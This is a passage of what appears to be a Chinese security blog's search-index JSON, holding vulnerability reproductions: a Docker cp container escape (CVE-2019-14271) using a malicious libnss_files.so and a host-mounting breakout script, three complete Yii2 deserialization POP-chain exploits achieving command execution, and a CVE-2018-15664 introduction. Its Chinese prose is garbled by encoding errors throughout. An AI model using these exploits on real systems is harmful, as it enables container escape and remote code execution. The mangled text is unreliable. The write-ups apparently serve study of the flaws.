return true; // we're running in the context of docker-tar } æ¶æ„libnss_files.so.2æ–‡ä»¶è¢«åŠ è½½æ—¶ï¼Œé¦–å…ˆä¼šåˆ¤æ–­å½“å‰åŠ è½½è¿›ç¨‹æ˜¯å¦ä¸ºdocker-tarè¿›ç¨‹ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä»¥å½“å‰è¿›ç¨‹çš„èº«ä»½æ‰§è¡Œ/breakoutè„šæœ¬ã€‚ç”±äºdocker-tarå¹¶æœªåšå…¶ä»–å‘½åç©ºé—´çº§åˆ«ä¸Šçš„éš”ç¦»ï¼Œå› æ­¤/breakoutä¼šä»¥docker-tarè‡ªèº«çš„rootæƒé™åœ¨å®¿ä¸»æœºå‘½åç©ºé—´å†…æ‰§è¡Œã€‚ ä¸‹é¢ç¼–è¯‘ç”Ÿæˆæ¶æ„é“¾æ¥æ–‡ä»¶ cd /root/gnu/glibc-build mkdir config1 ../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/ make //ç”Ÿæˆçš„æ¶æ„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä¸º/glibc-build/nss/libnss_files.soï¼›è¦æ³¨æ„çš„æ˜¯libnss_files.so.2ä¸ºé“¾æ¥æ–‡ä»¶ï¼Œåˆ«å¼„é”™äº† è¿™é‡Œæˆ‘ä»¬æ‰§è¡Œå¤±è´¥äº† ../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/ æ˜¯å› ä¸ºç¼ºå°‘äº†ä¾èµ–ï¼Œæ‰€ä»¥æŠ¥é”™ apt install bison apt install gawk ä¹‹åæ‰§è¡Œä¸€éå‘½ä»¤å°±ä¸ä¼šæŠ¥é”™äº† æˆ‘ä»¬makeä¸‹ è¦åœ¨/root/gnu/glibc-build/ç›®å½•ä¸‹æ‰§è¡Œ ç¬¬ä¸€æ¬¡ç¼–è¯‘Glibcéœ€è¦ä¸€äº›æ—¶é—´ï¼Œåé¢å†æ¬¡ç¼–è¯‘å°±ä¼šå¿«å¾ˆå¤šã€‚ç¼–è¯‘ç»“æŸåï¼Œglibc-build/nss/libnss_files.soå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚ å®ç°é€ƒé€¸ ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»æ„é€ å¥½æ¶æ„çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶libnss_files.soã€‚åœ¨å­˜åœ¨æ¼æ´çš„dokcerç¯å¢ƒä¸­ï¼Œå¦‚æœç”¨æˆ·æ‰§è¡Œäº†docker cpï¼Œåå°çš„docker-tarè¿›ç¨‹åœ¨æ‰§è¡Œäº†chrootå‘½ä»¤åä¸€æ—¦åŠ è½½æ¶æ„æ–‡ä»¶libnss_files.soï¼Œé‚£ä¹ˆå®¹å™¨å†…/breakoutè„šæœ¬å°±ä¼šä»¥docker-tarèº«ä»½æ‰§è¡Œã€‚ ç”±äºdocker-tarå·²ç»åˆ‡æ¢äº†æ ¹ç›®å½•ï¼Œä½†è¿˜æ²¡æœ‰åŠ å…¥å®¹å™¨çš„å‘½åç©ºé—´ï¼Œè€ƒè™‘åœ¨/breakoutä¸­æ‰§è¡ŒæŒ‚è½½æ“ä½œï¼Œç”±docker-tarå°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚åœ¨åˆ°å®¹å™¨å†…çš„/host_fsè·¯å¾„ã€‚è¿™æ ·å°±å®ç°äº†æ–‡ä»¶ç³»ç»Ÿå±‚é¢çš„å®¹å™¨é€ƒé€¸ã€‚ å°†æ­¤è„šæœ¬æ‹·è´åˆ°å®¹å™¨æ ¹ç›®å½•ï¼Œå¹¶ç»™å®ƒåŠ ä¸Š777æƒé™ #!/bin/bash umount /host_fs \u0026\u0026 rm -rf /host_fs mkdir /host_fs mount -t proc none /proc # mount the host's procfs over /proc cd /proc/1/root # chdir to host's root mount --bind . /hos","date":"2022-01-31","objectID":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["dockeræ¼æ´"],"title":"CVE-2019-14271æ¼æ´å¤ç°","uri":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"å‰è¨€ æœ€è¿‘å­¦ä¹ PHPååºåˆ—åŒ–é‡åˆ°äº†Yii2ååºåˆ—åŒ–å¾—åˆ©ç”¨ï¼Œå°±é¡ºä¾¿æ­ä¸€ä¸‹ç¯å¢ƒï¼Œè·Ÿç€ç½‘ä¸Šå„ç§å¸ˆå‚…ä»¬çš„æ–‡ç« å¤ç°å’Œå­¦ä¹ ï¼Œæé«˜è‡ªå·±ä»£ç å®¡è®¡èƒ½åŠ›ã€‚ æ¼æ´å‡ºç°åœ¨yii2.0.38ä¹‹å‰çš„ç‰ˆæœ¬ä¸­,åœ¨2.0.38è¿›è¡Œäº†ä¿®å¤ï¼ŒCVEç¼–å·æ˜¯CVE-2020-15148ï¼š Yii 2 (yiisoft/yii2) before version 2.0.38 is vulnerable to remote code execution if the application calls unserialize() on arbitrary user input. This is fixed in version 2.0.38. A possible workaround without upgrading is available in the linked advisory. Yii2ä»‹ç» Yii æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ï¼ŒåŸºäºç»„ä»¶çš„ PHP æ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘ç°ä»£ Web åº”ç”¨ç¨‹åºã€‚å³å¯ä»¥ç”¨äºå¼€å‘å„ç§ç”¨ PHP æ„å»ºçš„ Web åº”ç”¨ã€‚å› ä¸ºåŸºäºç»„ä»¶çš„æ¡†æ¶ç»“æ„å’Œè®¾è®¡ç²¾å·§çš„ç¼“å­˜æ”¯æŒï¼Œå®ƒç‰¹åˆ«é€‚åˆå¼€å‘å¤§å‹åº”ç”¨ï¼Œ å¦‚é—¨æˆ·ç½‘ç«™ã€ç¤¾åŒºã€å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€ ç”µå­å•†åŠ¡é¡¹ç›®å’Œ RESTful Web æœåŠ¡ç­‰ã€‚ ç¯å¢ƒæ­å»º windows10 phpstudy yii2ç‰ˆæœ¬:2.037å’Œ2.0.38 phpç‰ˆæœ¬:7.3.4 ä¿®æ”¹config\\web.phpä¸­çš„cookieValidationKeyä¸ºä»»æ„å€¼ï¼Œä½œä¸ºyii\\web\\request::cookieValidationKeyçš„åŠ å¯†å€¼ï¼Œä¸è®¾ç½®å°±ä¼šæŠ¥é”™ã€‚ æ¥ç€è‡ªå·±æ·»åŠ ä¸€ä¸ªcontrolleræ¥è¿›è¡Œæ¼æ´çš„åˆ©ç”¨ï¼Œåˆ›å»ºä¸€ä¸ªaction: http://url/index.php?r=test/test, controllersçš„å‘½åæ˜¯ : åç§°Controllerï¼Œactionçš„å‘½åæ˜¯: actionåç§°ï¼Œå¦‚ä¸‹ controllers/TestController.php \u003c?php namespace app\\controllers; use yii\\web\\Controller; class TestController extends Controller{ public function actionTest($data){ return unserialize(base64_decode($data)); } } ?\u003e å‘åŒ…æµ‹è¯•ï¼Œç¯å¢ƒæ­å»ºæˆåŠŸ ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["yii2æ¡†æ¶"],"title":"Yii2æ¡†æ¶ ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"2.3.07ç‰ˆæœ¬ååºåˆ—åŒ– POC1 æ¼æ´çš„è§¦å‘ç‚¹åœ¨\\yii\\vendor\\yii2\\db\\BatchQueryResult.phpæ–‡ä»¶ä¸­ï¼Œ public function __destruct() { // make sure cursor is closed $this-\u003ereset(); } public function reset() { if ($this-\u003e_dataReader !== null) { $this-\u003e_dataReader-\u003eclose(); } $this-\u003e_dataReader = null; $this-\u003e_batch = null; $this-\u003e_value = null; $this-\u003e_key = null; } å¯ä»¥çœ‹åˆ°ï¼Œ__destructè°ƒç”¨äº†resetæ–¹æ³• resetæ–¹æ³•resetè°ƒç”¨äº†closeæ–¹æ³•ï¼Œå‚æ•° _dataReaderå¯æ§ã€‚å­¦ä¹ æ€è·¯åçŸ¥é“è¿™é‡Œå¯ä»¥é€šè¿‡è§¦å‘ __callæ–¹æ³•æ¥è¿›è¡Œåˆ©ç”¨ __call:å½“ä¸€ä¸ªå¯¹è±¡åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ å½“ä¸€ä¸ªå¯¹è±¡è°ƒç”¨ä¸å¯è®¿é—®çš„closeæ–¹æ³•æˆ–è€…ç±»ä¸­å‹æ ¹å°±æ²¡æœ‰closeæ–¹æ³•ï¼Œå³å¯è§¦å‘ __call,å…¨å±€æœç´¢ __callæ–¹æ³• public function __call($method, $attributes) { return $this-\u003eformat($method, $attributes); } public function format($formatter, $arguments = array()) { return call_user_func_array($this-\u003egetFormatter($formatter), $arguments); } public function getFormatter($formatter) { if (isset($this-\u003eformatters[$formatter])) { return $this-\u003eformatters[$formatter]; } foreach ($this-\u003eproviders as $provider) { if (method_exists($provider, $formatter)) { $this-\u003eformatters[$formatter] = array($provider, $formatter); return $this-\u003eformatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter)); } __callæ–¹æ³•è°ƒç”¨äº†ç±»ä¸­çš„ formatçš„æ–¹æ³•ï¼Œformatæ–¹æ³•é‡Œçš„ call_user_func_arrayé‡Œçš„å‚æ•°è°ƒç”¨äº† getFormatteræ–¹æ³• call_user_func_array :è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•° å¤§è‡´ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹: \u003c?php functionÂ foobar($arg,Â $arg2)Â { echoÂ __FUNCTION__,Â \"Â gotÂ $argÂ andÂ $arg2\\n\"; } classÂ fooÂ { functionÂ bar($arg,Â $arg2)Â { echoÂ __METHOD__,Â \"Â gotÂ $argÂ andÂ $arg2\\n\"; } } //Â CallÂ theÂ foobar()Â functionÂ withÂ 2Â arguments call_user_func_array(\"foobar\",Â array(\"one\",Â \"two\")); //Â CallÂ theÂ $foo-\u003ebar()Â methodÂ withÂ 2Â arguments $fooÂ =Â newÂ foo; call_user_func_array(array($foo,Â \"bar\"),Â array(\"three\",Â \"four\")); ?\u003e getFormatteræ–¹æ³•ä» $this-\u003eformatterå¯æ§ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­çš„ä»»æ„æ–¹æ³•äº†ã€‚ ä½†æ˜¯ $argumentsæ˜¯ä» yii\\db\\BatchQueryResult::reset()é‡Œä¼ è¿‡æ¥çš„ï¼Œæˆ‘é—¨ä¸å¯æ§ï¼Œæ¯”å¦‚è¿™é‡Œå°±ä¸ºç©ºï¼Œå› ä¸ºä¼ æ¥çš„ closeæ–¹æ³•ä¸­ä¼ å‚æ•°å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä¸å¸¦å‚æ•°åœ°å»è°ƒç”¨åˆ«çš„ç±»ä¸­çš„æ–¹æ³•ã€‚ åˆ°è¿™ä¸€æ­¥å°±éœ€è¦ä¸€ä¸ªæ‰§è¡Œç±»ï¼Œè¿™æ—¶å€™éœ€è¦ç±»ä¸­çš„æ–¹æ³•éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ æ–¹æ³•æ‰€éœ€çš„å‚æ•°åªèƒ½æ˜¯å…¶è‡ªå·±ç±»ä¸­å­˜åœ¨çš„(å³å‚æ•°: $this-\u003eargs) æ–¹æ³•éœ€è¦æœ‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ é€šè¿‡å…¨å±€æŸ¥æ‰¾æ­£åˆ™åŒ¹é… call_user_func\\(\\$this-\u003e([a-zA-Z0-9]+), \\$this-\u003e([a-zA-Z0-9]+)æ¥æŸ¥æ‰¾ï¼Œç»“æœå¦‚ä¸‹ call_user_func :æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ç”¨ï¼Œè¿™é‡Œç”¨ call_user_funcå³å¯è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœä¹Ÿå¯ä»¥è¾¾åˆ° RCE çš„æ•ˆæœ å¤§è‡´ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ \u003c?php error_reporting(E_ALL); functionÂ increment(\u0026$var) { $var++; } $aÂ =Â 0; call_user_func('increment',Â $a); echoÂ $a.\"\\n\"; call_user_func_array('increment',Â array(\u0026$a));Â //Â YouÂ canÂ useÂ thisÂ insteadÂ beforeÂ PHPÂ 5.3 echoÂ $a.\"\\n\"; ?\u003e å…¶ä¸­æœ‰ä¸¤ä¸ªç±»ä¸­çš„ runæ–¹æ³•å¯ç”¨ yii\\rest\\CreateAction::run() ï¼Œ$this-\u003eidä¸¤ä¸ªå‚æ•°å¯æ§ public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } //ä¸»è¦è¿˜æ˜¯çœ‹è¿™é‡Œ /* @var $model \\yii\\db\\ActiveRecord */ $model = new $this-\u003emodelClass([ 'scenario' =\u003e $this-\u003escenario, ]); $model-\u003eload(Yii::$app-\u003egetRequest()-\u003egetBodyParams(), ''); if ($model-\u003esave()) { $response = Yii::$app-\u003egetResponse(); $response-\u003esetStatusCode(201); $id = implode(',', array_values($model-\u003egetPrimaryKey(true))); $response-\u003egetHeaders()-\u003eset('Location', Url::toRoute([$this-\u003eviewAction, 'id' =\u003e $id], true)); } elseif (!$model-\u003ehasErrors()) { throw new ServerErrorHttpException('Failed to create the object for unknown reason.'); } return $model; } \\yii\\rest\\IndexAction::run(), $this-\u003echeckAccess,$this-\u003eidä¸¤ä¸ªå‚æ•°å¯æ§ public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } return $this-\u003eprepareDataProvider(); } äºæ˜¯å°±å¯ä»¥æ„é€ å®Œæ•´çš„ popé“¾ yii\\db\\BatchQueryResult::__destruct()-\u003ereset()-\u003eclose() -\u003e Faker\\Generator::__call()-\u003eformat()-\u003ecall_user_func_array() -\u003e \\yii\\rest\\IndexAction::run-\u003ecall_user_func() Exp \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'phpinfo'; $this-\u003eid = '1'; //command } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters['close'] = [new IndexAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u003e_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(n","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["yii2æ¡†æ¶"],"title":"Yii2æ¡†æ¶ ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"2.3.08ç‰ˆæœ¬ååºåˆ—åŒ– åˆ©ç”¨é“¾çš„èµ·ç‚¹\\yii\\vendor\\codeception\\codeception\\ext\\RunProcess.php public function __destruct() { $this-\u003estopProcess(); } public function stopProcess() { foreach (array_reverse($this-\u003eprocesses) as $process) { /** @var $process Process **/ if (!$process-\u003eisRunning()) { continue; } $this-\u003eoutput-\u003edebug('[RunProcess] Stopping ' . $process-\u003egetCommandLine()); $process-\u003estop(); } $this-\u003eprocesses = []; } åŒæ ·è¿˜æ˜¯æ‰¾ __destruct()æ–¹æ³•è°ƒç”¨äº† stopProcesså‡½æ•°ï¼Œå› ä¸ºè¿™é‡Œçš„ $this-\u003eprocesseså¯æ§ï¼Œä¹Ÿå°±æ„å‘³ç€ processå¯æ§ï¼Œç„¶åä¸‹é¢åˆè°ƒç”¨äº† process-\u003eisRunning,å¯ä»¥æ¥ä¸Šç¬¬ä¸€æ¡åˆ©ç”¨é“¾çš„ __callæ–¹æ³•å¼€å¤´çš„ååŠæ®µã€‚ åˆ©ç”¨é“¾1 Codeception\\Extension\\RunProcess::__destruct()-\u003eFaker\\Genrator::__call()-\u003eyii\\rest\\IndexAction::run() Poc2 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'ls'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning $this-\u003eformatters['isRunning'] = [new CreateAction(), 'run']; } } } // poc2 namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct() { $this-\u003eprocesses = [new Generator()]; } } } namespace{ // ç”Ÿæˆpoc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess())); } ?\u003e è¿è¡Œpocï¼ŒæˆåŠŸRCEäº† åˆ©ç”¨é“¾2 \\yii\\vendor\\swiftmailer\\swiftmailer\\lib\\classes\\Swift\\KeyCache\\DiskKeyCache.phpæ–‡ä»¶ä¸­ï¼Œ public function __destruct() { foreach ($this-\u003ekeys as $nsKey =\u003e $null) { $this-\u003eclearAll($nsKey); } } è·Ÿè¿› clearAllæ–¹æ³• public function clearAll($nsKey) { if (array_key_exists($nsKey, $this-\u003ekeys)) { foreach ($this-\u003ekeys[$nsKey] as $itemKey =\u003e $null) { $this-\u003eclearKey($nsKey, $itemKey); } if (is_dir($this-\u003epath.'/'.$nsKey)) { rmdir($this-\u003epath.'/'.$nsKey); } unset($this-\u003ekeys[$nsKey]); } } è¿™é‡Œçš„this-\u003ekeysä»¥åŠ$nsKeyã€$itemKeyéƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥æ‰§è¡Œåˆ°$this-\u003eclearKeyçš„ï¼Œè·Ÿè¿›çœ‹çœ‹: public function clearKey($nsKey, $itemKey) { if ($this-\u003ehasKey($nsKey, $itemKey)) { $this-\u003efreeHandle($nsKey, $itemKey); unlink($this-\u003epath.'/'.$nsKey.'/'.$itemKey); } } è¿™é‡Œçš„$this-\u003epathä¹Ÿå¯æ§ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è¿›è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æ“ä½œï¼Œé‚£ä¹ˆæ„å‘³ç€å¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³•__toStringæ¥è§¦å‘åç»­æ“ä½œã€‚ å…¨å±€æœç´¢__toString æ–‡ä»¶è·¯å¾„\\yii\\vendor\\phpdocumentor\\reflection-docblock\\src\\DocBlock\\Tags\\see.php ä½¿ç”¨See.phpä¸¾ä¾‹ public function __toString() : string { return $this-\u003erefers . ($this-\u003edescription ? ' ' . $this-\u003edescription-\u003erender() : ''); } å¯ä»¥çœ‹åˆ°$this-\u003edescriptionå¯æ§ï¼Œåˆå¯ä»¥åˆ©ç”¨ __call åˆ©ç”¨é“¾3 Swift_KeyCache_DiskKeyCache -\u003e phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-\u003e Faker\\Generator::__call() -\u003e yii\\rest\\IndexAction::run() POC3 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'phpinfo'; $this-\u003eid = '1'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning $this-\u003eformatters['render'] = [new CreateAction(), 'run']; } } } namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-\u003edescription = new Generator(); } } } namespace{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache{ private $keys = []; private $path; public function __construct() { $this-\u003epath = new See; $this-\u003ekeys = array( \"axin\"=\u003earray(\"is\"=\u003e\"handsome\") ); } } // ç”Ÿæˆpoc echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache())); } ?\u003e ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["yii2æ¡†æ¶"],"title":"Yii2æ¡†æ¶ ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"å°ç»“ å‘ç°è¿™å‡ ä¸ªpopé“¾ç”¨æ¥ç”¨å»æœ€åéƒ½æ˜¯é ç€__callæ–¹æ³•æ¥è§¦å‘ä»£ç æ‰§è¡Œã€‚ æ‰¾é“¾å­çš„å¼€ç«¯å¯ä»¥å°è¯•ä»__destructå…¥æ‰‹ï¼Œç„¶åè¿½é“¾ï¼Œè¿½æ–¹æ³• __call_user_funcä¸­çš„callbackå¯ä»¥æ˜¯æ•°ç»„ 2.0.38è¿˜æœ‰2ä¸ªé“¾å­æ²¡å¼„ 2.0.42è¿˜æœ‰é“¾å­â€¦. ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["yii2æ¡†æ¶"],"title":"Yii2æ¡†æ¶ ååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"ç¬¬ä¸€ç¯‡æ–‡ç« ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["dockeræ¼æ´"],"title":"CVE-2018-15664æ¼æ´å¤ç°","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"CVE-2018-15664ï¼šç¬¦å·é“¾æ¥æ›¿æ¢æ¼æ´ å‰ç½®çŸ¥è¯† docker cp ç”¨äºå®¹å™¨å’Œå®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¹‹é—´è¿›è¡Œæ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶ //å°†ä¸»æœº/www/xxxæ–‡ä»¶æ‹·è´åˆ°å®¹å™¨685c2a289adfçš„/wwwç›®å½•ä¸‹(è‹¥æ˜¯/www,åˆ™æ˜¯æ‹·è´åˆ°å®¹å™¨æ ¹ç›®å½•ä¸‹ï¼Œé‡å‘½åä¸ºwww) docker cp /www/xxx 685c2a289adf:/www/ //å°†å®¹å™¨685c2a289adfä¸‹çš„/wwwç›®å½•æ‹·è´åˆ°ä¸»æœºçš„/tmpç›®å½•ä¸­ docker cp 685c2a289adf:/www /tmp/ ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["dockeræ¼æ´"],"title":"CVE-2018-15664æ¼æ´å¤ç°","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"æ¼æ´ä»‹ç» å­˜åœ¨:18.06.1-ce-rc2ç‰ˆæœ¬å‰ä¸­çš„Dockerä¸­ docker cp å‘½ä»¤ å¯¹åº”çš„åç«¯APIå­˜åœ¨åŸºäºæ¡ä»¶ç«äº‰çš„ç¬¦å·é“¾æ¥æ›¿æ¢æ¼æ´ï¼Œèƒ½å¤Ÿå¯¼è‡´ç›®å½•ç©¿è¶Šã€‚ å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´é€ƒé€¸å‡ºå®¹å™¨è¯»å–æˆ–ç¯¡æ”¹hostå…¶ä»–ä»»æ„å®¹å™¨å†…çš„æ–‡ä»¶ã€‚ å…¶å®æ˜¯ä¸€ä¸ªTOCTOUï¼ˆtime-of-check to time-of-useï¼‰ï¼Œä½¿ç”¨FollowSymlinkInScopeå‡½æ•°æ—¶è§¦å‘æ–‡ä»¶ç³»ç»Ÿçš„æ¡ä»¶ç«äº‰ç¼ºé™·å¯¼è‡´ï¼Œå±äºç«æ€æ¡ä»¶æ¼æ´ ç«æ€æ¡ä»¶æ¼æ´ï¼Œå³ç¨‹åºå¯¹æŸå¯¹è±¡è¿›è¡Œå®‰å…¨æ£€æŸ¥å’Œä½¿ç”¨è¯¥å¯¹è±¡çš„æ­¥éª¤ä¹‹é—´å­˜åœ¨é—´éš™ï¼Œæ”»å‡»è€…å¯ä»¥å…ˆæ„é€ å¹¶æ”¾ç½®ä¸€ä¸ªèƒ½å¤Ÿé€šè¿‡å®‰å…¨æ£€æŸ¥çš„åˆæ³•å¯¹è±¡ï¼Œé¡ºåˆ©é€šè¿‡ç›®æ ‡ç¨‹åºçš„å®‰å…¨æ£€æŸ¥æµç¨‹ï¼Œç„¶åå†æ‰§è¡Œä¹‹å‰ç«‹å³ä½¿ç”¨æ¶æ„å¯¹è±¡æ›¿æ¢ä¹‹é—´çš„åˆæ³•å¯¹è±¡ã€‚ FollowSymlinkInScopeä½œç”¨:è§£æå®¹å™¨è¿è¡Œä¸­è¿è¡Œè¿›ç¨‹çš„æ–‡ä»¶è·¯å¾„ã€‚æ”»å‡»è€…å°±åˆ©ç”¨è§£ææ ¡éªŒå®Œæˆä¹‹åå’Œæ“ä½œæ‰§è¡Œé—´çš„ç©ºéš™ï¼Œä¿®æ”¹cpæ–‡ä»¶ï¼Œæ”¹ä¸ºä¸€ä¸ªç¬¦å·é“¾æ¥å¯¹åº”çš„ç›®æ ‡æ–‡ä»¶ Docker daemonæ”¶åˆ°docker cpçš„è¯·æ±‚ï¼Œä¼šå¯¹å¤åˆ¶çš„è·¯å¾„è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœè·¯å¾„ä¸­æœ‰å®¹å™¨å†…çš„ç¬¦å·é“¾æ¥ï¼Œå°±å…ˆåœ¨å®¹å™¨å†…éƒ¨å°†å…¶è§£ææˆè·¯å¾„å­—ç¬¦ä¸²ï¼Œç•™å¾…åç”¨ çœŸå®è¿‡ç¨‹ï¼šDocker daemonæ£€æŸ¥å¤åˆ¶è·¯å¾„æ—¶ï¼Œæ”»å‡»è€…æ”¾ç½®æ­£å¸¸çš„éç¬¦å·è¿æ¥çš„å¸¸è§„æ–‡ä»¶æˆ–ç›®å½•ï¼Œåœ¨æ£€æŸ¥ç»“æŸä¹‹åã€docker daemonä½¿ç”¨è·¯å¾„å‰ï¼Œå°†å…¶æ›¿æ¢æˆç¬¦å·è¿æ¥ åˆ©ç”¨æ¡ä»¶ï¼š hackeréœ€è¦æœ‰docker cpçš„ä½¿ç”¨æƒé™å’Œç›®æ ‡å®¹å™¨çš„è®¿é—®æƒé™ è§£ææ–‡ä»¶ï¼Œåˆ°å®Œæˆcpçš„åŠ¨ä½œï¼Œæ˜¯æ¯«ç§’çº§ï¼Œæ”»å‡»éš¾åº¦è¾ƒå¤§ ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["dockeræ¼æ´"],"title":"CVE-2018-15664æ¼æ´å¤ç°","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"æ­å»ºç¯å¢ƒ ä½¿ç”¨Metargetæä¾›çš„é¶åœºç¯å¢ƒ git clone https://github.com/Metarget/metarget.git cd metarget ./metarget cnv install cve-2018-15664 ","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["dockeræ¼æ´"],"title":"CVE-2018-15664æ¼æ´å¤ç°","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"poc: https://seclists.org/oss-sec/2019/q2/131 